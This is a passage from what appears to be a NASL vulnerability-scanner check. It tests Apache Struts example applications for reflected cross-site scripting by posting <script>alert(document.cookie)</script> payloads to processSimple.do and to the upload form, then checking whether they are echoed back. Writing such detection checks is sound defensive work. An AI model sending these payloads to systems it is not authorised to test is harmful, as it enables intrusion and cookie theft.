...
for indexpage in make_list( "/struts-cookbook/",
	 "/struts-examples/",
	...
	if(ContainsString( res, ">Struts Cookbook<" )){
		found_app = TRUE;
		postdata = "name=xyz&secret=xyz&color=red&message=%3Cscript%3Ealert" + "%28document.cookie%29%3C%2Fscript%3E&hidden=Sssh%21+It%" + "27s+a+secret.+Nobody+knows+I%27m+here.";
		url = dir + "/processSimple.do";
		req = NASLString( "POST ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "User-Agent: ", useragent, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", strlen( postdata ), "\\r\\n", "\\r\\n", postdata );
		res = http_keepalive_send_recv( port: port, data: req );
		if(IsMatchRegexp( res, "^HTTP/1\\.[01] 200" ) && ContainsString( res, "<script>alert(document.cookie)</script>" ) && ContainsString( res, ">Simple ActionForm Example<" )){
			report = http_report_vuln_url( port: port, url: url );
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
	if(ContainsString( res, ">Struts Examples<" )){
		found_app = TRUE;
		postdata = "-----------------------------7559840272055538773136052934" + "\r\nContent-Disposition: form-data; name=\"theText\"\r\n\r\n" + "\r\n-----------------------------7559840272055538773136052" + "934\r\nContent-Disposition: form-data; name=\"theFile\"; fil" + "ename=\"\"\r\nContent-Type: application/octet-stream\r\n\r\n" + "\r\n-----------------------------7559840272055538773136052" + "934\r\nContent-Disposition: form-data; name=\"filePath\"\r\n" + "\r\n<script>alert(document.cookie)</script>\r\n-----------" + "------------------7559840272055538773136052934--\r\n";
		url = dir + "/upload/upload-submit.do?queryParam=Successful";
		req = NASLString( "POST ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "User-Agent: ", useragent, "\\r\\n", "Content-Type: multipart/form-data; boundary=---" + "------------------------7559840272055538773136052934\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", strlen( postdata ), "\\r\\n", "\\r\\n", postdata );
		res = http_keepalive_send_recv( port: port, data: req );
		if(IsMatchRegexp( res, "^HTTP/1\\.[01] 200" ) && ContainsString( res, "<script>alert(document.cookie)</script>" ) && ContainsString( res, ">File Upload Example<" )){
			report = http_report_vuln_url( port: port, url: url );
			security_message( port: port, data: report );
			exit( 0 );
		}
